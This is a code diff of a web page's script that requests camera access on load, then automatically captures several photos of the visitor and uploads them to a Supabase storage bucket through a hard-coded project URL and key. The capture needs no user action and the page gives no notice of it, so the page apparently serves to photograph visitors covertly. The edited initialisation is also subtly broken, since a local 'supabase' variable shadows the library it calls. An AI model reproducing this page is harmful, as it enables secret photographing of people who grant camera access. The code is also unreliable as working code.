@@ -9,29 +9,35 @@
     <video id="video" autoplay></video>
     <p id="status"></p>
 
+    <!-- Include Supabase library from CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
     <script>
+        // Initialize Supabase client
         const SUPABASE_URL = 'https://xsibckeasnitdilcdzoe.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhzaWJja2Vhc25pdGRpbGNkem9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc0ODczODEsImV4cCI6MjA1MzA2MzM4MX0.lv5XOKY3vBL94y4hksOshDexrBwsuynHEzTrgn06diE';
 
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        let supabase; // Declare supabase variable here
 
-        // Access the camera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+        window.addEventListener('DOMContentLoaded', () => {
+            supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-                video.addEventListener('loadeddata', () => {
-                    captureAndUploadPhotos();
+            // Access the camera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    video.addEventListener('loadeddata', () => {
+                        captureAndUploadPhotos();
+                    });
+                })
+                .catch((err) => {
+                    document.getElementById('status').innerText = 'Camera access denied!';
+                    console.error(err);
                 });
-            })
-            .catch((err) => {
-                document.getElementById('status').innerText = 'Camera access denied!';
-                console.error(err);
-            });
+        });
 
-        // Capture and upload photos
+        // Function to capture and upload photos
         async function captureAndUploadPhotos() {
             const video = document.getElementById('video');
             const canvas = document.createElement('canvas');
@@ -47,7 +53,7 @@
                 const blob = await (await fetch(imageData)).blob();
                 const fileName = `photo-${Date.now()}-${i + 1}.png`;
 
-                // Upload Blob to Supabase
+                // Upload Blob to Supabase bucket
                 const { data, error } = await supabase.storage.from('user-media').upload(fileName, blob, {
                     contentType: 'image/png'
                 });
